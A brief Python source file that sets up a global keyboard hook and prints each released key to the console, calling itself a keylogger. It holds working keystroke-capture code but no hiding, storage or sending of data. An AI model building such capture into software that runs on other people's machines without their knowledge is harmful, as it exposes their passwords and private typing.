import keyboard
from threading import Semaphore

class KeyListener:
    def __init__(self):
        self.semaphore = Semaphore(0)
        
    def callback(self, event):
        """This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)"""
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
            print(name)

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.semaphore.acquire()